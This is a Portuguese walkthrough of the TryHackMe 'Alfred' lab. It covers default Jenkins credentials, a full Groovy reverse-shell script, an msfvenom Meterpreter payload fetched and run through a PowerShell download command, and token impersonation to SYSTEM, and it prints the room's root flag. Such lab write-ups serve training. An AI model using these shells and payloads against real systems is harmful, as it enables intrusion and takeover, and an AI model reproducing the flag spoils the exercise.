---
title: "TryHackMe - Alfred"
author: mithr4nd1r
date: 2022-09-04 11:00:00 -0300
categories: [Walkthrough, TryHackMe]
tags: [writeup, walkthrough, tryhackme, thm, pentest, ctf, windows, easy, jenkins, groovy, meterpreter, token-impersonation, incognito]
pin: false
---

> **Dificuldade**: Fácil
{: .prompt-info }

> Writeup importado do Notion. Imagens originais omitidas.
{: .prompt-tip }

## Scan

```bash
nmap -sSV -v -p- -Pn 10.10.32.137 --min-rate=10000
```

```
PORT     STATE SERVICE    VERSION
80/tcp   open  http       Microsoft IIS httpd 7.5
3389/tcp open  tcpwrapped
8080/tcp open  http       Jetty 9.4.z-SNAPSHOT
```

## Enumeração

Porta 8080: Jenkins (Jetty backend). Default creds testadas com sucesso.

### Credenciais: `admin:admin`

## Acesso Inicial — Jenkins Groovy Script Console

Jenkins permite executar Groovy diretamente via Script Console (`/script`):

```groovy
String host="10.18.21.69";
int port=8000;
String cmd="cmd.exe";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();
Socket s=new Socket(host,port);
InputStream pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream();
OutputStream po=p.getOutputStream(),so=s.getOutputStream();
while(!s.isClosed()){
  while(pi.available()>0)so.write(pi.read());
  while(pe.available()>0)so.write(pe.read());
  while(si.available()>0)po.write(si.read());
  so.flush();po.flush();Thread.sleep(50);
  try {p.exitValue();break;}catch (Exception e){}
};
p.destroy();s.close();
```

```bash
nc -lnvp 8000
```

Reverse shell como `alfred\bruce` recebido.

```
C:\Program Files (x86)\Jenkins>whoami
alfred\bruce
```

User flag em `C:\Users\bruce\Desktop\user.txt`.

## Migração para Meterpreter

```bash
msfvenom -p windows/meterpreter/reverse_tcp -a x86 \
  --encoder x86/shikata_ga_nai \
  LHOST=10.18.21.69 LPORT=9000 -f exe -o presente.exe
```

Hospedar via `python -m http.server 80` e baixar no alvo:

```powershell
powershell "(New-Object System.Net.WebClient).Downloadfile(\'http://10.18.21.69:80/presente.exe\',\'presente.exe\')"
.\presente.exe
```

Handler em msfconsole:

```
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST 10.18.21.69
set LPORT 9000
exploit
```

## Pós-Exploração — Whoami Privs

```
whoami /priv
SeImpersonatePrivilege   Enabled  ← CRÍTICO
SeDebugPrivilege         Enabled
SeChangeNotifyPrivilege  Enabled
SeCreateGlobalPrivilege  Enabled
```

`SeImpersonatePrivilege` ativo → **Token Impersonation viável**.

## PrivEsc — Incognito Token Impersonation

```
meterpreter > load incognito
meterpreter > list_tokens -g
```

Token `BUILTIN\Administrators` disponível como **Delegation Token**.

```
meterpreter > impersonate_token "BUILTIN\Administrators"
[+] Successfully impersonated user NT AUTHORITY\SYSTEM
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

### Migração para processo SYSTEM real

TryHackMe nota: token impersonation dá acesso temporário; migrar para processo SYSTEM "real" estabiliza:

```
meterpreter > ps
# escolher PID de processo SYSTEM (ex: svchost.exe PID 3040)
meterpreter > migrate 3040
[*] Migration completed successfully.
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

## Root Flag

```
C:\Windows\System32\config>type root.txt
dff0f748678f280250f25a45b8046b4a
```

## Resumo da Cadeia

| Etapa | Técnica |
|-------|---------|
| Recon | nmap → Jenkins :8080 |
| Foothold | Default creds `admin:admin` |
| RCE | Jenkins Groovy Script Console → reverse shell |
| Migration | msfvenom payload + meterpreter handler |
| PrivEsc | Incognito + token impersonation (SeImpersonate) |
| Persistence | Migrate para PID SYSTEM para estabilidade |
